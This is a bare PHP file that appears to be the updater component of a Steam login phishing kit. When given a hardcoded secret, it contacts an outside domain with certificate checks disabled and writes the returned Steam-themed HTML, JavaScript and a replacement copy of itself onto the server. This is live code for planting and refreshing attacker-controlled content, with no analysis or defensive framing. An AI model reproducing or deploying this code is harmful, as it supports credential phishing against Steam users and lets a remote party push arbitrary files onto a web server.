<?php

$phpName = "add2199bb8ec3c74c267be5969a6411d.php";
$steamHtmlName = "txqmjgkxhzp5.html";
$steamScriptName = "/static/ndmkkcq6vc09.js";
$windowScriptName = "/static/vljvylnrdlf0.js";
$domainToLogin = "nikitadayn.top";
$resourceUrl = "https://nikitadayn.top/f4qa88kinibw3xgibqll6thsihved0r6dw7fs";
$postData = [
    "secret" => "36bdfd0a909fb68a0fd46924d1e2bc39",
    "authBtnClass" => "lk0e6gi8s69v",
    "steamHtmlName" => $steamHtmlName,
    "steamScriptName" => $steamScriptName,
    "windowScriptName" => $windowScriptName,
];
$buildId = "f40b719b-a790-4ad4-92ca-60b5de3ffe04";
$version = "1";


$update = isset($_GET['update']) && $_GET['update'] === 'true';
$secret = isset($_GET['secret']) ?$_GET["secret"] : null;

if($secret !== $postData["secret"]){
	echo "false";
} else if($update) {
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $resourceUrl);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

	$response = curl_exec($ch);

	if(curl_errno($ch)) {
		echo '\nError:' . curl_error($ch);
	} else if(!is_writable($windowScriptName)){
        echo "\nDirectory is unvailable for writting: " . $windowScriptName;
   } else {
		$responseData = json_decode($response, true);

		if (isset($responseData['windowScript'])) {
			$result = file_put_contents($windowScriptName, $responseData["windowScript"]);

			if($result === false) {
				echo "\nFailed to write window script\n";
			}
		}

		if (isset($responseData['steamScript'])) {
			$result = file_put_contents($steamScriptName, $responseData["steamScript"]);

			if($result === false) {
				echo "\nFailed to write steam script\n";
			}
		}

		if (isset($responseData['steamFile'])) {
			$result = file_put_contents($steamHtmlName, $responseData["steamFile"]);

			if($result === false) {
				echo "\nFailed to write steam file\n";
			}
		}

		if (isset($responseData['updatePhp'])) {
			$result = file_put_contents($phpName, $responseData["updatePhp"]);

			if($result === false) {
				echo "\nFailed to write update php file\n";
			}
		}

		echo "success";
	}

	curl_close($ch);
} else {
	header('Content-Type: application/json');

	echo json_encode([
		"success" => true,
		"buildId" => $buildId,
		"version" => $version
	]);
}

?>